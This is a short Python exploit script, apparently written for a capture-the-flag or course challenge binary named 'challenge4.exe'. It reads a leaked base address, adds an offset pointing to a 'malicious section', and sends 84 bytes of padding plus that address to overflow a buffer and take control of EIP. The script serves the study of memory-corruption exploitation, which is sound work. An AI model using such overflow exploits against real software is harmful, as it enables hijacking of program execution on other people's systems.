import subprocess
import sys
import struct
#Assuming the script is run from the directory where the binary is located
program_path = "challenge4.exe"
arg= "modified.exe"
cmd = [program_path, arg]
p = subprocess.Popen (cmd, stdin=subprocess.PIPE)
#ask the user for the leaked base address
leaked_base= raw_input()
# convert the leaked address into an hexidecimal integer and include the offset of the malicious section
address = struct.pack('<I', (int(leaked_base, 16) + 0x5C00))
# overflow the buffer to control EIP and point EIP to the malicious section 
input_str = ("\x00"* 84 + address)
p.communicate(input=input_str.encode())